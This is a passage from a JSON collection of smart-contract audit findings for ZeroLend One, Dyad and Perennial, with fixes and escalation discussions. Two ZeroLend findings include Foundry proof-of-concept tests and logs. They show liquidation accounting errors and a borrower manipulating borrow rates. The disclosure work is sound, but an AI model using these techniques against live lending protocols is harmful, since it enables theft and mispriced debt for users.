amounts. e.g. `_repayDebtTokens()` function calls the `repayDebt` function whose input is supposed to be assets:\n\n```solidity\n  function _repayDebtTokens( ... ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex); // <-- @audit `vars.actualDebtToLiquidate` is shares at this moment\n    vars.debtReserveCache.nextDebtShares = burnt;\n  }\n```\n\nThus, when a liquidator tries to cover full debts, the liquidation will leave `((borrowIndex - 1) / borrowIndex) * debtShares` debt shares and will set the borrowing status of the debt asset as false via the following [code snippet](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L150-L152).\n\n```solidity\n  function executeLiquidationCall(...) external {\n    ... ...\n    if (vars.userDebt == vars.actualDebtToLiquidate) {\n      userConfig.setBorrowing(debtReserve.id, false);\n    }\n    ... ...\n  }\n```\n\n### Proof-Of-Concept\n\nTo make a test case simple, I simplified the oracle price feeds like the below in the `CorePoolTests.sol` file:\n\n```diff\n  function _setUpCorePool() internal {\n    ... ...\n    oracleA = new MockV3Aggregator(8, 1e8);\n-   oracleB = new MockV3Aggregator(18, 2 * 1e8);\n+   oracleB = new MockV3Aggregator(8, 1e8);\n    ... ...\n  }\n```\n\nAnd created a new test file `PoolLiquidationTest2.sol`:\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport \"../../../../lib/forge-std/src/console.sol\";\n\nimport './PoolSetup.sol';\n\nimport {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';\n\nimport {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';\n\ncontract PoolLiquidationTest2 is PoolSetup {\n  using UserConfiguration for DataTypes.UserConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveData;\n\n  address alice = address(1);\n  address bob = address(2);\n\n  uint256 mintAmountA = 200 ether;\n  uint256 mintAmountB = 200 ether;\n  uint256 supplyAmountA = 60 ether;\n  uint256 supplyAmountB = 60 ether;\n  uint256 borrowAmountB = 45 ether;\n\n  function setUp() public {\n    _setUpPool();\n    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));\n  }\n\n  // @audit-poc\n  function testLiquidationInvalidUnits() external {\n    oracleA.updateAnswer(1e8);\n    oracleB.updateAnswer(1e8);\n\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0);\n    vm.stopPrank();\n\n    // Advance time to make the position unhealthy\n    vm.warp(block.timestamp + 360 days);\n    oracleA.updateAnswer(1e8);\n    oracleB.updateAnswer(1e8);\n\n    // Print log of borrow rate before liquidation\n    pool.forceUpdateReserve(address(tokenB));\n    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowIndex before Liq.\", reserveDataB.borrowIndex);\n\n    DataTypes.PositionBalance memory positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);\n    console.log('debtShares Before Liq.', positionBalance.debtShares);\n\n    DataTypes.UserConfigurationMap memory userConfig = pool.getUserConfiguration(alice, 0);\n    console.log('TokenB isBorrowing Before Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));\n\n    vm.startPrank(bob);\n    vm.expectEmit(true, true, true, false);\n    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether); // @audit Tries to cover full debts\n    vm.stopPrank();\n\n    positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);\n    console.log('debtShares After Liq.', positionBalance.debtShares);\n\n    userConfig = pool.getUserConfiguration(alice, 0);\n    console.log('TokenB isBorrowing After Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));\n  }\n}\n```\nAnd here are the logs:\n```bash\n$ forge test --match-test testLiquidationInvalidUnits -vvv\n[⠒] Compiling...\n[⠊] Compiling 1 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 4.83s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2\n[PASS] testLiquidationInvalidUnits() (gas: 1172963)\nLogs:\n  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640\n  debtShares Before Liq. 45000000000000000000\n  TokenB isBorrowing Before Liq. true\n  debtShares After Liq. 9076447170314674990\n  TokenB isBorrowing After Liq. false\n```\n\nAs can be seen from the logs, there are significant amount of debts left but the borrowing flag was set as false.\n\n## Impact\n\nWrongly setting borrowing status as false will affect the calculation of total debt amount, LTV and health factor, and this incorrect calculation will affect the whole ecosystem of a pool.\n\n## Code Snippet\n\n[pool/logic/LiquidationLogic.sol#L136](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136)\n\n[pool/logic/LiquidationLogic.sol#L264](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L264)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the issued lines in the `LiquidationLogic.sol` file:\n\n```diff\n  function executeLiquidationCall(\n    ... ...\n  ) external {\n    ... ...\n-   vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;\n+   vars.userCollateralBalance = balances[params.collateralAsset][params.position].getSupplyBalance(collateralReserve.liquidityIndex);\n    ... ...\n  }\n\n  function _calculateDebt(\n    ... ...\n  ) internal view returns (uint256, uint256) {\n-   uint256 userDebt = balances[params.debtAsset][params.position].debtShares;\n+   uint256 userDebt = balances[params.debtAsset][params.position].getDebtBalance(borrowIndex);\n  }\n```\n\nI tried the above POC testcase to the update and the logs are:\n\n```bash\n$ forge test --match-test testLiquidationInvalidUnits -vv\n[⠒] Compiling...\n[⠊] Compiling 7 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 5.90s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2\n[PASS] testLiquidationInvalidUnits() (gas: 1137920)\nLogs:\n  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640\n  debtShares Before Liq. 45000000000000000000\n  TokenB isBorrowing Before Liq. true\n  debtShares After Liq. 0\n  TokenB isBorrowing After Liq. false\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nThere are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Tomiwasa0**\n\nAgain i agree with @DemoreXTess , These are two different functions, \nA fix for A doesn't solve B although the seem similar. \nHence 2 different Root cause, similar impact. \nThey should be Duplicated into \n1. Wrong debt amount\n2. Wrong Collateral amount\n\n**samuraii77**\n\n> Escalate\n> \n> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\nNo, it's unfair for watsons who reported both as one if they are split into 2. The issue caused by a single root cause.\n\n**DemoreXTess**\n\n@samuraii77 People who submitted both issues at ones should be the duplicate of both two unique issues. There is nothing wrong about that.\n\n**cvetanovv**\n\nI disagree with the escalation and thought the Lead Judge correctly duplicated them.\n\nThe root cause is that the liquidation will be called with wrong values. And those Watsons who correctly judged the root cause would be harmed by a potential separation. \n\nPlanning to reject the escalation and leave the issue as is.\n\n**DemoreXTess**\n\n@cvetanovv I don't understand. What is your argument for your rejection ? Some of watsons will suffer from that or issues are really same ? \n\nThe root cause are completely different. Solving one of those problems doesn't solve the other issue. They are not even in same block scope. \n\nIf the reason of rejection is the reports who mentioned both issues, we should also consider the watsons who submitted both issues in separate. There are 2 different high issues and it reduces the worth of submissions significantly which is far worse in this situation.\n\n**DemoreXTess**\n\n@cvetanovv If you system doesnt support 1 report 2 duplicate system, we can't do anything for them but it is Watson's responsibility to identify which issue is duplicate of another issue. Those issues are definitely different as I stated above.\n\n**cvetanovv**\n\n@DemoreXTess This is not the main reason. \n\nAs I have written, the root cause is that the liquidation will be called with wrong values. \n\nYou can also see my comment on your other similar escalation https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473#issuecomment-2426173895\n\nThe same principle is grouped when there are reentrancy vulnerabilities, lack of slippage protection, or unsafe cast. Even if they are different functions and contracts, we duplicate them together.\n\n**DemoreXTess**\n\n@cvetanovv Okay, then my escalations are invalid for both. I didn't know that rule in Sherlock. Thank you for clarification.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107/#issuecomment-2391661677): rejected",
      "summary": "\nThe bug report concerns a problem with the liquidation process in a smart contract. The liquidator is unable to fully cover the debts of the user being liquidated, and the borrowing status of the debt asset is set to false. This is due to a mistake in the code where debt shares are used instead of debt assets. The report also includes a discussion among experts on whether the issue should be escalated or not. The final resolution is to reject the escalation and mark the issue as high priority with duplicates. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107",
      "tags": [],
      "finders": [
        "JCN",
        "dany.armstrong90",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "iamnmt",
        "zarkk01",
        "KupiaSec",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "dhank",
        "Varun\\_05",
        "Bigsam",
        "TessKimy",
        "0xc0ffEE",
        "almurhasan",
        "Honour",
        "coffiasd"
      ]
    },
    {
      "id": "41811",
      "title": "H-1: A Reserve Borrow Rate can be significantly decreased after liquidation",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, BiasedMerc, Honour, JCN, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, dhank, ether\\_sky, jah, lemonmon, perseus, rilwan99, stuart\\_the\\_minion, trachev, wellbyt3, zarkk01\n## Summary\n\nWhen performing a liquidation, the borrow rate of the reserve is updated by burnt debt shares instead of the remaining debt shares.\n\nTherefore, according to the amount of the burnt shares in a liquidation, the borrow rate can be significantly decreased.\n\n## Vulnerability Detail\n\nIn the `LiquidationLogic::executeLiquidationCall()` function, there is a `_repayDebtTokens()` function call to burn covered debt shares through the liquidation.\n\n```solidity\n  function executeLiquidationCall(\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,\n    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,\n    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,\n    DataTypes.ExecuteLiquidationCallParams memory params\n  ) external {\n    ... ...\n    _repayDebtTokens(params, vars, balances[params.debtAsset], totalSupplies[params.debtAsset]);\n    ... ...\n  }\n```\n\nIn the `_repayDebtTokens()` function, `nextDebtShares` of `debtReserveCache` is updated with burnt shares instead of the remaining debt shares.\n\n```solidity\n  function _repayDebtTokens(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    mapping(bytes32 => DataTypes.PositionBalance) storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);\n    vars.debtReserveCache.nextDebtShares = burnt; // <-- Wrong here!!!\n  }\n```\n\nThis incorrectly updated `debtReserveCache.nextDebtShares` then is used to update the borrow rate in interest rate strategy.\n\nConsequently, we can have conclusion that the less amount of debt is covered when running a liquidation, the lower the borrow rate gets because next borrow rate depends on the amount of burnt debt shares.\n\n### Proof-Of-Concept\n\nHere is a proof test case:\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport \"../../../../lib/forge-std/src/console.sol\";\n\nimport './PoolSetup.sol';\n\nimport {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';\n\nimport {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';\n\ncontract PoolLiquidationTest is PoolSetup {\n  using UserConfiguration for DataTypes.UserConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveData;\n\n  address alice = address(1);\n  address bob = address(2);\n\n  uint256 mintAmountA = 1000 ether;\n  uint256 mintAmountB = 2000 ether;\n  uint256 supplyAmountA = 550 ether;\n  uint256 supplyAmountB = 750 ether;\n  uint256 borrowAmountB = 400 ether;\n\n  function setUp() public {\n    _setUpPool();\n    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));\n  }\n\n  // @audit-poc\n  function testLiquidationDecreaseBorrowRatePoc() external {\n    oracleA.updateAnswer(100e8);\n    oracleB.updateAnswer(100e8);\n\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB - 1 ether, 0);\n    vm.stopPrank();\n\n    // Advance time to make the position unhealthy\n    vm.warp(block.timestamp + 360 days);\n    oracleA.updateAnswer(100e8);\n    oracleB.updateAnswer(100e8);\n\n    // Expect the position unhealthy\n    vm.startPrank(alice);\n    vm.expectRevert(bytes('HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD'));\n    pool.borrowSimple(address(tokenB), alice, 1 ether, 0);\n    vm.stopPrank();\n\n    // Print log of borrow rate before liquidation\n    pool.forceUpdateReserve(address(tokenB));\n    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowRate before:\", reserveDataB.borrowRate);\n\n    vm.startPrank(bob);\n    vm.expectEmit(true, true, true, false);\n    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 0.01 ether);\n    vm.stopPrank();\n\n    // Print log of borrow rate after liquidation\n    reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowRate after: \", reserveDataB.borrowRate);\n  }\n}\n\n```\n\nAnd logs are:\n```bash\n$ forge test --match-test testLiquidationDecreaseBorrowRatePoc -vvv\n[⠒] Compiling...\n[⠊] Compiling 11 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 5.89s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests.t.sol:PoolLiquidationTest\n[PASS] testLiquidationDecreaseBorrowRatePoc() (gas: 1205596)\nLogs:\n  reserveDataB.borrowRate before: 105094339622641509433962264\n  reserveDataB.borrowRate after:  4242953968798528786019\n```\n\n## Impact\n\nA malicious borrower can manipulate the borrow rate of his any unhealthy positions and repay his debt with signficantly low borrow rate.\n\n## Code Snippet\n\n[pool/logic/LiquidationLogic.sol#L246](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L246)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nShould update the `nextDebtShares` with `totalSupplies.debtShares`:\n\n```diff\n  function _repayDebtTokens(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    mapping(bytes32 => DataTypes.PositionBalance) storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);\n-   vars.debtReserveCache.nextDebtShares = burnt;\n+   vars.debtReserveCache.nextDebtShares = totalSupplies.debtShares;\n  }\n\n```",
      "summary": "\nThis bug report discusses an issue where the borrow rate of a reserve can be significantly decreased after a liquidation. The issue was discovered by a group of security experts and is caused by a mistake in the code that updates the borrow rate. This mistake can be exploited by a malicious borrower to manipulate their borrow rate and repay their debt at a lower rate. The code snippet responsible for this issue is identified and a recommendation is given to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104",
      "tags": [],
      "finders": [
        "JCN",
        "perseus",
        "Tendency",
        "trachev",
        "0xAlix2",
        "BiasedMerc",
        "lemonmon",
        "zarkk01",
        "jah",
        "KupiaSec",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "dhank",
        "Varun\\_05",
        "rilwan99",
        "TessKimy",
        "wellbyt3",
        "0xc0ffEE",
        "almurhasan",
        "Honour"
      ]
    },
    {
      "id": "44037",
      "title": "[H-02] Insufficient Exogenous Collateral Check in `VaultManagerV2::liquidate()` function",
      "impact": "HIGH",
      "content": "## Severity\n\nHigh Risk\n\n## Description\n\nCode4rena issue #338 linked [here](https://github.com/code-423n4/2024-04-dyad-findings/issues/338).\n\nThe issue shows that liquidations do not go through if the exogenous collateral does not sufficiently back the `DYAD` minted.\n\nThe protocol lays down 2 ground rules:\n\n1. Exo collateral backs `DYAD` at least 1:1 (100%)\n2. Kerosene can be used to keep the minimum backing to 150%.\n\nSo for this to function properly, a user must have exo-backing of 100% and exo+kerosene backing of 150%. But if a user's exo-backing falls below 100% but their exo+kerosene backing is still above 150%, they won't get liquidated:\n\n```solidity\nif (collatRatio(id) >= MIN_COLLAT_RATIO) revert CrTooHigh();\n```\n\nThis can lead to systematic problems with collateral backing.For instance, if there is 1 million USD worth of exo collateral, and 1 million DYAD minted. Let's also say 600k USD worth of kerosene is in the vaults as well.\n\nNow, Exo collateral backing = 1 million / 1 million = 100%\nTotal backing = `1.6 / 1 = 160%`.\n\nNow, say the price of the exo collateral drops so there is only 950k USD worth of exo collateral left. Exo collateral backing = 950k / 1 million = 95%\nTotal backing = `1.55 / 1 = 155 %`.\n\nIf this was a single vault, this wouldn't be liquidatable since the CR is still above 150%.\n\nThe overall backing of the system is not 100% with exo collateral anymore. This can lead to people closing and withdrawing funds from their vaults, which further reduces the TVL of the system.\n\nThe main idea is that the system and individual vaults can reach a state where some of the `DYAD` is backed by kerosene, and not by other exo collateral. This would make it a fractionally collateralized stablecoin, like `FRAX` or `DEI`, both of which had stability issues and `FRAX` later voted to fully collateralize itself.\n\n## Location of Affected Code\n\nFile [src/core/VaultManagerV2.sol#L179](https://github.com/DyadStablecoin/contracts/blob/37b4d8bbbb59de52b25056fa8b9759203fe2bc1d/src/core/VaultManagerV2.sol#L179)\n\n## Recommendation\n\nConsider allowing liquidations when exo collateral backing goes below 100% as well. This will prevent the total exo collateral backing from going below 100% unless it is a large bad debt event.\n\n## Team Response\n\nAcknowledged.",
      "summary": "\nThis bug report discusses an issue with the code for a protocol called Code4rena, specifically with the liquidation process. The report explains that if a user's collateral backing falls below 100% but their overall backing is still above 150%, they will not be liquidated. This can lead to problems with the overall collateral backing of the system and may cause users to withdraw their funds. The report recommends allowing liquidations when the collateral backing falls below 100% to prevent the system from becoming fractionally collateralized. The team has acknowledged the issue and may consider making changes to the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Dyad-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "44036",
      "title": "[H-01] The `redeemDyad()` Function Does Not Adjust Decimals Properly",
      "impact": "HIGH",
      "content": "## Severity\n\nHigh Risk\n\n## Description\n\nThe `redeemDyad()` function can be called to burn up DYAD tokens to free up collateral, and then pay out that collateral to the owner.\n\n```solidity\nburnDyad(id, amount);\nVault _vault = Vault(vault);\nuint asset = amount\n    * 10**_vault.oracle().decimals()\n    / _vault.assetPrice();\nwithdraw(id, vault, asset, to);\n```\n\nThe issue is that this only works for assets which are in `18 decimals`. For assets like `USDC` `(6 decimals)` or `WBTC` `(8 decimals)`, the math is incorrect since the decimals are not adjusted.\n\nFor example, let's say a Chainlink oracle is used for a vault with `USDC` `(6 decimals)` and the price feed has `8 decimals`. So the price feed returns `1e8`.\n\nSay the amount of DYAD repaid = `100 dollars` = `100e18`, since the DYAD is in `18 decimals`.\n\nThen `asset` is calculated as = `100e18 * 1e8 / 1e8 = 100e18`\n\nSo `100e18` `USDC` is going to be removed instead of `100e6`.\n\nThis can lead to reverts, or unintentional collateral withdrawals which can lead to unintentional liquidations.\n\n## Location of Affected Code\n\nFile: [src/core/VaultManagerV2.sol#L163-L164](https://github.com/DyadStablecoin/contracts/blob/37b4d8bbbb59de52b25056fa8b9759203fe2bc1d/src/core/VaultManagerV2.sol#L163-L164)\n\n## Recommendation\n\nAdjust with the asset decimals.\n\n```diff\nfunction redeemDyad(\n    uint id,\n    address vault,\n    uint amount,\n    address to\n) external isDNftOwner(id) returns (uint) {\n    burnDyad(id, amount);\n    Vault _vault = Vault(vault);\n    uint asset = amount\n-       * 10**_vault.oracle().decimals()\n-       / _vault.assetPrice();\n+       * (10**(_vault.oracle().decimals() + _vault.asset().decimals()))\n+       / _vault.assetPrice()\n+       / 1e18;\n    withdraw(id, vault, asset, to);\n    emit RedeemDyad(id, vault, amount, to);\n    return asset;\n}\n```\n\n## Team Response\n\nFixed as proposed.",
      "summary": "\nThe report describes a high risk bug in the `redeemDyad()` function of the DYAD token contract. This function is used to burn DYAD tokens and release collateral to the owner. However, the math used in the function only works for assets with 18 decimals, causing incorrect calculations for assets with fewer decimals. This can lead to reverts or unintended collateral withdrawals, potentially resulting in liquidations. The affected code is located in the `VaultManagerV2.sol` file. The recommendation is to adjust the math to account for the asset's decimals. The team has responded that they have fixed the issue as proposed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Dyad-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "44035",
      "title": "[C-01] Missing Asset Decimal Adjustment When Calculating TVL",
      "impact": "HIGH",
      "content": "## Severity\n\nCritical Risk\n\n## Description\n\nWhen the TVL is being calculated in the `VaultKerosene.sol` contract the balance is multiplied with the oracle price, and adjusted with the oracle decimals.\n\n```solidity\ntvl += vault.asset().balanceOf(address(vault))\n    * vault.assetPrice()\n    / (10**vault.oracle().decimals());\n```\n\nHowever, it does not adjust this based on the asset decimals. Furthermore, the `assetPrice` here is just a Chainlink oracle, as seen in the vault implementations.\n\n```solidity\nfunction assetPrice() public view returns (uint256) {\n    (, int256 answer,, uint256 updatedAt,) = oracle.latestRoundData();\n    if (block.timestamp > updatedAt + STALE_DATA_TIMEOUT) revert StaleData();\n    return answer.toUint256();\n}\n```\n\nSo if two vaults have `WBTC` and `WETH`, they will have different decimals and different amounts. But their price feeds will return the same decimals. So they will return a different scale of prices.\n\nSay both `WBTC` and `WETH` are valued at 100 USD. So price feed returns 1e10 for both.\n\nFor 1e8 `WBTC`: `tvl = 1e8 * 1e10 / 1e8 = 1e10`\n\nFor 1e18 `WETH`: `tvl = 1e18 * 1e10 / 1e8 = 1e20`\n\nSo `WBTC` is massively undervalued.\n\n## Location of Affected Code\n\nFile: [src/core/VaultKerosene.sol#L113-L115](https://github.com/DyadStablecoin/contracts/blob/37b4d8bbbb59de52b25056fa8b9759203fe2bc1d/src/core/VaultKerosene.sol#L113-L115)\n\n## Recommendation\n\nAdjust by asset decimals.\n\n```diff\nfunction assetPrice() public view override returns (uint) {\n    uint tvl;\n    address[] memory vaults = kerosineManager.getVaults();\n    uint numberOfVaults = vaults.length;\n    for (uint i = 0; i < numberOfVaults; i++) {\n    Vault vault = Vault(vaults[i]);\n    tvl += vault.asset().balanceOf(address(vault))\n-       * vault.assetPrice()\n-       / (10**vault.oracle().decimals());\n+       * vault.assetPrice() * 1e18\n+       / (10**vault.asset().decimals())\n+       / (10**vault.oracle().decimals());\n    }\n\n    if (tvl < dyad.totalSupply()) return 0;\n    uint numerator   = tvl - dyad.totalSupply();\n    uint denominator = kerosineDenominator.denominator();\n    return numerator * 1e8 / denominator;\n}\n```\n\n## Team Response\n\nFixed as proposed.",
      "summary": "\nThis bug report highlights an issue in the `VaultKerosene.sol` contract where the TVL (total value locked) calculation is not adjusted for different asset decimals. This results in undervaluation of certain assets, such as `WBTC`. The affected code can be found in the `src/core/VaultKerosene.sol` file, specifically lines 113-115. The recommendation is to adjust for asset decimals in the calculation. The team has responded that they have fixed the issue as proposed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Dyad-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "31182",
      "title": "M-10: ChainlinkFactory will pay non-requested versions keeper fees",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/32 \n\n## Found by \nbin2chen\n## Summary\nProtocol definition: `Requested versions will pay out a keeper fee, non-requested versions will not.`\nBut ChainlinkFactory ignores `numRequested`, which pays for both.\n## Vulnerability Details\nProtocol definition: `Requested versions will pay out a keeper fee, non-requested versions will not.`\n\n```solidity\n    /// @notice Commits the price to specified version\n    /// @dev Accepts both requested and non-requested versions.\n    ///      Requested versions will pay out a keeper fee, non-requested versions will not.\n    ///      Accepts any publish time in the underlying price message, as long as it is within the validity window,\n    ///      which means its possible for publish times to be slightly out of order with respect to versions.\n    ///      Batched updates are supported by passing in a list of price feed ids along with a valid batch update data.\n    /// @param ids The list of price feed ids to commit\n    /// @param version The oracle version to commit\n    /// @param data The update data to commit\n    function commit(bytes32[] memory ids, uint256 version, bytes calldata data) external payable {\n```\n`commit()`->`_handleKeeperFee()`->`_applicableValue()`\n`ChainlinkFactory._applicableValue ()` implements the following:\n```solidity\n    function _applicableValue(uint256, bytes memory data) internal view override returns (uint256) {\n        bytes[] memory payloads = abi.decode(data, (bytes[]));\n        uint256 totalFeeAmount = 0;\n        for (uint256 i = 0; i < payloads.length; i++) {\n            (, bytes memory report) = abi.decode(payloads[i], (bytes32[3], bytes));\n            (Asset memory fee, ,) = feeManager.getFeeAndReward(address(this), report, feeTokenAddress);\n            totalFeeAmount += fee.amount;\n        }\n        return totalFeeAmount;\n    }\n```\n\nThe above method ignores the first parameter `numRequested`.\nThis way, whether it is `Requested versions` or not, you will pay `keeper fees`.\nViolating `non-requested versions will not pay`\n\n## Impact\nIf `non-requested versions` will pay as well, it is easy to maliciously submit `non-requested` maliciously consume `ChainlinkFactory` fees balance\n(Note that needs at least one numRequested  to call `_handleKeeperFee()` )\n\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-oracle/contracts/chainlink/ChainlinkFactory.sol#L71\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt is recommended that only `Requested versions`  keeper fees'\n\n```diff\n-   function _applicableValue(uint256 , bytes memory data) internal view override returns (uint256) {\n+   function _applicableValue(uint256 numRequested, bytes memory data) internal view override returns (uint256) {\n        bytes[] memory payloads = abi.decode(data, (bytes[]));\n        uint256 totalFeeAmount = 0;\n        for (uint256 i = 0; i < payloads.length; i++) {\n            (, bytes memory report) = abi.decode(payloads[i], (bytes32[3], bytes));\n            (Asset memory fee, ,) = feeManager.getFeeAndReward(address(this), report, feeTokenAddress);\n            totalFeeAmount += fee.amount;\n        }\n-       return totalFeeAmount;\n+       return totalFeeAmount * numRequested / payloads.length ;\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> valid medium, the attacker will have to commit requested along with unrequested which might not be easy to do due to competition\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/293",
